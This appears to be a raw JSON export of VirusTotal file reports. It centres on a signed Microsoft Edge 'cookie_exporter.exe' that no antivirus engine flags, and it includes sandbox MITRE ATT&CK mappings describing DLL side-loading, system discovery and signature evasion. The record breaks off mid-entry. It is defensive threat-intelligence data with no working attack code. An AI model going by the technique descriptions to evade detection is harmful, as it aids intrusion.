            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "contain obfuscated stackstrings"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/005/",
                "id": "T1027.005",
                "name": "Indicator Removal from Tools"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/192ef0dee8df73eec9ee617abe4b0104799f9543a22a41e28d4d44c3ad713284/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65b4fa4d48448ff030e4867f"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "tlsh": "T19BC35B5773A430EAE1B78674C4915A06EB77F83107219BDF03B086991F237C99E3AB25",
      "vhash": "0150b6655d15551550101az4a!z",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "creation_date": 1671093713,
      "names": [
        "cookie_exporter.exe",
        "cookie_exporter_exe",
        "MsMpSrv.exe",
        "d4fe3a6968a9709539343ad0497ae8874fe77db79b8da8398e5c2098c5056a69"
      ],
      "signature_info": {
        "product": "Microsoft Edge",
        "verified": "Signed",
        "description": "Microsoft Edge",
        "file version": "108.0.1462.54",
        "signing date": "06:35 PM 12/15/2022",
        "x509": [
          {
            "valid usage": "0.4.1.311.10.3, Code Signing",
            "name": "Microsoft Corporation",
            "algorithm": "sha256RSA",
            "valid from": "2022-05-12 20:46:04",
            "valid to": "2023-05-11 20:46:04",
            "serial number": "33 00 00 02 CF A0 25 90 E3 13 04 EF 15 00 00 00 00 02 CF",
            "cert issuer": "Microsoft Code Signing PCA 2011",
            "thumbprint": "6D216F47522FBABB5F0E1846DB42AE800A885B6A"
          },
          {
            "name": "Microsoft Code Signing PCA 2011",
            "algorithm": "sha256RSA",
            "valid from": "2011-07-08 20:59:09",
            "valid to": "2026-07-08 21:09:09",
            "serial number": "61 0E 90 D2 00 00 00 00 00 03",
            "cert issuer": "Microsoft Root Certificate Authority 2011",
            "thumbprint": "F252E794FE438E35ACE6E53762C0A234A2C52135"
          },
          {
            "valid usage": "ff",
            "name": "Microsoft Time-Stamp Service",
            "algorithm": "sha256RSA",
            "valid from": "2022-09-20 20:22:09",
            "valid to": "2023-12-14 20:22:09",
            "serial number": "33 00 00 01 B4 FB 80 08 44 05 D2 2D FA 00 01 00 00 01 B4",
            "cert issuer": "Microsoft Time-Stamp PCA 2010",
            "thumbprint": "659CD890F39B97F6737829126DFE01E4271E0908"
          },
          {
            "valid usage": "Timestamp Signing",
            "name": "Microsoft Time-Stamp PCA 2010",
            "algorithm": "sha256RSA",
            "valid from": "2021-09-30 18:22:25",
            "valid to": "2030-09-30 18:32:25",
            "serial number": "33 00 00 00 15 C5 E7 6B 9E 02 9B 49 99 00 00 00 00 00 15",
            "cert issuer": "Microsoft Root Certificate Authority 2010",
            "thumbprint": "36056A5662DCADECF82CC14C8B80EC5E0BCC59A6"
          }
        ],
        "original name": "cookie_exporter.exe",
        "signers": "Microsoft Corporation; Microsoft Code Signing PCA 2011; Microsoft Root Certificate Authority 2011",
        "counter signers details": [
          {
            "status": "This certificate or one of the certificates in the certificate chain is not time valid.",
            "valid usage": "Timestamp Signing",
            "name": "Microsoft Time-Stamp Service",
            "algorithm": "sha256RSA",
            "valid from": "08:22 PM 09/20/2022",
            "valid to": "08:22 PM 12/14/2023",
            "serial number": "33 00 00 01 B4 FB 80 08 44 05 D2 2D FA 00 01 00 00 01 B4",
            "cert issuer": "Microsoft Time-Stamp PCA 2010",
            "thumbprint": "659CD890F39B97F6737829126DFE01E4271E0908"
          },
          {
            "status": "Valid",
            "valid usage": "Timestamp Signing",
            "name": "Microsoft Time-Stamp PCA 2010",
            "algorithm": "sha256RSA",
            "valid from": "06:22 PM 09/30/2021",
            "valid to": "06:32 PM 09/30/2030",
            "serial number": "33 00 00 00 15 C5 E7 6B 9E 02 9B 49 99 00 00 00 00 00 15",
            "cert issuer": "Microsoft Root Certificate Authority 2010",
            "thumbprint": "36056A5662DCADECF82CC14C8B80EC5E0BCC59A6"
          },
          {
            "status": "Valid",
            "valid usage": "All",
            "name": "Microsoft Root Certificate Authority 2010",
            "algorithm": "sha256RSA",
            "valid from": "09:57 PM 06/23/2010",
            "valid to": "10:04 PM 06/23/2035",
            "serial number": "28 CC 3A 25 BF BA 44 AC 44 9A 9B 58 6B 43 39 AA",
            "cert issuer": "Microsoft Root Certificate Authority 2010",
            "thumbprint": "3B1EFD3A66EA28B16697394703A72CA340A05BD5"
          }
        ],
        "counter signers": "Microsoft Time-Stamp Service; Microsoft Time-Stamp PCA 2010; Microsoft Root Certificate Authority 2010",
        "copyright": "Copyright Microsoft Corporation. All rights reserved.",
        "signers details": [
          {
            "status": "This certificate or one of the certificates in the certificate chain is not time valid.",
            "valid usage": "1.3.6.1.4.1.311.10.3.21, Code Signing",
            "name": "Microsoft Corporation",
            "algorithm": "sha256RSA",
            "valid from": "08:46 PM 05/12/2022",
            "valid to": "08:46 PM 05/11/2023",
            "serial number": "33 00 00 02 CF A0 25 90 E3 13 04 EF 15 00 00 00 00 02 CF",
            "cert issuer": "Microsoft Code Signing PCA 2011",
            "thumbprint": "6D216F47522FBABB5F0E1846DB42AE800A885B6A"
          },
          {
            "status": "Valid",
            "valid usage": "All",
            "name": "Microsoft Code Signing PCA 2011",
            "algorithm": "sha256RSA",
            "valid from": "08:59 PM 07/08/2011",
            "valid to": "09:09 PM 07/08/2026",
            "serial number": "61 0E 90 D2 00 00 00 00 00 03",
            "cert issuer": "Microsoft Root Certificate Authority 2011",
            "thumbprint": "F252E794FE438E35ACE6E53762C0A234A2C52135"
          },
          {
            "status": "Valid",
            "valid usage": "All",
            "name": "Microsoft Root Certificate Authority 2011",
            "algorithm": "sha256RSA",
            "valid from": "10:05 PM 03/22/2011",
            "valid to": "10:13 PM 03/22/2036",
            "serial number": "3F 8B C8 B5 FC 9F B2 96 43 B5 69 D6 6C 42 E1 44",
            "cert issuer": "Microsoft Root Certificate Authority 2011",
            "thumbprint": "8F43288AD272F3103B6FB1428485EA3014C0BCFE"
          }
        ],
        "internal name": "cookie_exporter_exe"
      },
      "last_modification_date": 1706185463,
      "type_tag": "peexe",
      "times_submitted": 25,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "size": 120264,
      "type_extension": "exe",
      "authentihash": "155276f2e04e8f91499ba308d294d59c0cd92ca4900f69f7601e8b18c2cbd4f6",
      "detectiteasy": {
        "filetype": "PE64",
        "values": [
          {
            "info": "GUI64,signed",
            "version": "14.0",
            "type": "Linker",
            "name": "Microsoft Linker"
          },
          {
            "version": "2015 v.14.0",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "version": "16.00",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "info": "PKCS #7",
            "version": "2.0",
            "type": "Sign tool",
            "name": "Windows Authenticode"
          }
        ]
      },
      "last_submission_date": 1703753277,
      "meaningful_name": "cookie_exporter.exe",
      "trid": [
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 63.5
        },
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 12.2
        },
        {
          "file_type": "Generic Win/DOS Executable",
          "probability": 12
        },
        {
          "file_type": "DOS Executable Generic",
          "probability": 12
        }
      ],
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "harmless",
          "confidence": 2,
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "CLEAN"
          ]
        },
        "C2AE": {
          "category": "undetected",
          "sandbox_name": "C2AE",
          "malware_classification": [
            "UNKNOWN_VERDICT"
          ]
        }
      },
      "sha256": "da252b823e15e067ae154173f481639934ecbd086369e851cf203170d65836e8",
      "tags": [
        "peexe",
        "assembly",
        "overlay",
        "runtime-modules",
        "signed",
        "detect-debug-environment",
        "idle",
        "64bits"
      ],
      "last_analysis_date": 1704841527,
      "unique_sources": 25,
      "first_submission_date": 1671151061,
      "sha1": "75a8ceded496269e9877c2d55f6ce13551d93ff4",
      "ssdeep": "3072:oVNL+dJ5lVurLhYoexFt3ToadZ1fbG5hQO1b:IqdJn0LeoeGmb85",
      "md5": "b64c6dec57859355a7c032aa02d64d28",
      "pe_info": {
        "resource_details": [
          {
            "lang": "ENGLISH US",
            "entropy": 3.494823694229126,
            "chi2": 86866.25,
            "filetype": "unknown",
            "sha256": "b64fff4164bec9eb5aa18248dc5eae7c869c73696732160025bc63870f6aeeed",
            "type": "RT_VERSION"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 5.355626106262207,
            "chi2": 4830.1,
            "filetype": "XML",
            "sha256": "508eca3e16e10df2c156f5ab2889cd7260ab971a8c425409f1ab960923b2af14",
            "type": "RT_MANIFEST"
          }
        ],
        "resource_types": {
          "RT_MANIFEST": 1,
          "RT_VERSION": 1
        },
        "imphash": "93623b0f02883b108b7f1e14b1da842c",
        "overlay": {
          "entropy": 7.493319511413574,
          "offset": 110080,
          "chi2": 11932.92,
          "filetype": "unknown",
          "size": 10184,
          "md5": "aabfb04233eb4115d8b7fcd4e2cf9cc5"
        },
        "resource_langs": {
          "ENGLISH US": 2
        },
        "machine_type": 34404,
        "timestamp": 1671093713,
        "entry_point": 4832,
        "sections": [
          {
            "name": ".text",
            "chi2": 324250.5,
            "virtual_address": 4096,
            "entropy": 6.45,
            "raw_size": 52736,
            "flags": "rx",
            "virtual_size": 52425,
            "md5": "ba50f11bc2481e5299acff4db8475387"
          },
          {
            "name": ".rdata",
            "chi2": 2301962.5,
            "virtual_address": 57344,
            "entropy": 4.65,
            "raw_size": 38400,
            "flags": "r",
            "virtual_size": 37996,
            "md5": "cbe413023a5674ec1cce290c27ecc2af"
          },
          {
            "name": ".data",
            "chi2": 492862.22,
            "virtual_address": 98304,
            "entropy": 1.87,
            "raw_size": 3072,
            "flags": "rw",
            "virtual_size": 7424,
            "md5": "14e90bbc8552645fff7f161927df3196"
          },
          {
            "name": ".pdata",
            "chi2": 224271.62,
            "virtual_address": 106496,
            "entropy": 4.61,
            "raw_size": 4096,
            "flags": "r",
            "virtual_size": 3840,
            "md5": "96625f3d67598953fae1f042990460d7"
          },
          {
            "name": ".00cfg",
            "chi2": 120556,
            "virtual_address": 110592,
            "entropy": 0.34,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 40,
            "md5": "0e248a359e2b1cb07a93ba82ee846e43"
          },
          {
            "name": ".gxfg",
            "chi2": 217069.25,
            "virtual_address": 114688,
            "entropy": 4.89,
            "raw_size": 4096,
            "flags": "r",
            "virtual_size": 3888,
            "md5": "82db77d74d86b87b7d407e3a730c029f"
          },
          {
            "virtual_address": 118784,
            "entropy": 0.85,
            "name": ".retplne",
            "raw_size": 512,
            "chi2": 105403,
            "virtual_size": 92,
            "md5": "8ba86516d84cef220ecd4ff8550b6df0"
          },
          {
            "virtual_address": 122880,
            "entropy": 0.8,
            "name": ".voltbl",
            "raw_size": 512,
            "chi2": 110441,
            "virtual_size": 47,
            "md5": "3e62ab2b543c77aa88ff3d2c1f580bae"
          },
          {
            "name": "_RDATA",
            "chi2": 77138,
            "virtual_address": 126976,
            "entropy": 1.94,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 252,
            "md5": "dc48b287009792ed8451049797bf9509"
          },
          {
            "name": ".rsrc",
            "chi2": 158626.09,
            "virtual_address": 131072,
            "entropy": 3.91,
            "raw_size": 2560,
            "flags": "r",
            "virtual_size": 2056,
            "md5": "08782c8965d742248698d6f9c0a49585"
          },
          {
            "name": ".reloc",
            "chi2": 38140.75,
            "virtual_address": 135168,
            "entropy": 4.86,
            "raw_size": 2048,
            "flags": "r",
            "virtual_size": 1628,
            "md5": "a96bc92398233d36147376a41515a9df"
          }
        ],
        "import_list": [
          {
            "library_name": "KERNEL32.dll",
            "imported_functions": [
              "CloseHandle",
              "CreateFileW",
              "DeleteCriticalSection",
              "EncodePointer",
              "EnterCriticalSection",
              "ExitProcess",
              "FindClose",
              "FindFirstFileExW",
              "FindNextFileW",
              "FlsAlloc",
              "FlsFree",
              "FlsGetValue",
              "FlsSetValue",
              "FlushFileBuffers",
              "FreeEnvironmentStringsW",
              "FreeLibrary",
              "GetACP",
              "GetCommandLineA",
              "GetCommandLineW",
              "GetConsoleMode",
              "GetConsoleOutputCP",
              "GetCPInfo",
              "GetCurrentProcess",
              "GetCurrentProcessId",
              "GetCurrentThreadId",
              "GetEnvironmentStringsW",
              "GetFileType",
              "GetLastError",
              "GetModuleFileNameW",
              "GetModuleHandleExW",
              "GetModuleHandleW",
              "GetOEMCP",
              "GetProcAddress",
              "GetProcessHeap",
              "GetStartupInfoW",
              "GetStdHandle",
              "GetStringTypeW",
              "GetSystemTimeAsFileTime",
              "HeapAlloc",
              "HeapFree",
              "HeapReAlloc",
              "HeapSize",
              "InitializeCriticalSectionAndSpinCount",
              "InitializeSListHead",
              "IsDebuggerPresent",
              "IsProcessorFeaturePresent",
              "IsValidCodePage",
              "LCMapStringW",
              "LeaveCriticalSection",
              "LoadLibraryExA",
              "LoadLibraryExW",
              "MultiByteToWideChar",
              "QueryPerformanceCounter",
              "RaiseException",
              "RtlCaptureContext",
              "RtlLookupFunctionEntry",
              "RtlPcToFileHeader",
              "RtlUnwindEx",
              "RtlVirtualUnwind",
              "SetErrorMode",
              "SetFilePointerEx",
              "SetLastError",
              "SetStdHandle",
              "SetThreadErrorMode",
              "SetUnhandledExceptionFilter",
              "TerminateProcess",
              "TlsAlloc",
              "TlsFree",
              "TlsGetValue",
              "TlsSetValue",
              "UnhandledExceptionFilter",
              "WideCharToMultiByte",
              "WriteConsoleW",
              "WriteFile"
            ]
          }
        ]
      },
      "magic": "PE32+ executable (GUI) x86-64, for MS Windows",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 4,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 0,
        "undetected": 68
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Elastic": {
          "category": "undetected",
          "engine_name": "Elastic",
          "engine_version": "4.0.123",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240106"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Skyhigh": {
          "category": "undetected",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240106"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.135.50684",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Alibaba": {
          "category": "undetected",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.135.50685",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Cybereason": {
          "category": "undetected",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.614",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "tehtris": {
          "category": "undetected",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "ESET-NOD32": {
          "category": "undetected",
          "engine_name": "ESET-NOD32",
          "engine_version": "28542",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "APEX": {
          "category": "undetected",
          "engine_name": "APEX",
          "engine_version": "6.487",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240107"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "MicroWorld-eScan": {
          "category": "undetected",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Avast": {
          "category": "undetected",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5030",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "GData": {
          "category": "undetected",
          "engine_name": "GData",
          "engine_version": "A:25.37135B:27.34507",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Webroot": {
          "category": "undetected",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Google": {
          "category": "undetected",
          "engine_name": "Google",
          "engine_version": "1704837625",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.154.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36332",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Arcabit": {
          "category": "undetected",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "ZoneAlarm": {
          "category": "undetected",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "240109-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Varist": {
          "category": "undetected",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-09.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Cylance": {
          "category": "undetected",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "Fortinet": {
          "category": "undetected",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "AVG": {
          "category": "undetected",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "DeepInstinct": {
          "category": "undetected",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240109"
        },
        "CrowdStrike": {
          "category": "undetected",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231026"
        }
      },
      "reputation": 0,
      "first_seen_itw_date": 1671079313
    },
    "type": "file",
    "id": "da252b823e15e067ae154173f481639934ecbd086369e851cf203170d65836e8",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/da252b823e15e067ae154173f481639934ecbd086369e851cf203170d65836e8"
    }
  },
  "mitre": {
    "data": {
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Tries to load missing DLLs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/002/",
                "id": "T1574.002",
                "name": "DLL Side-Loading"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
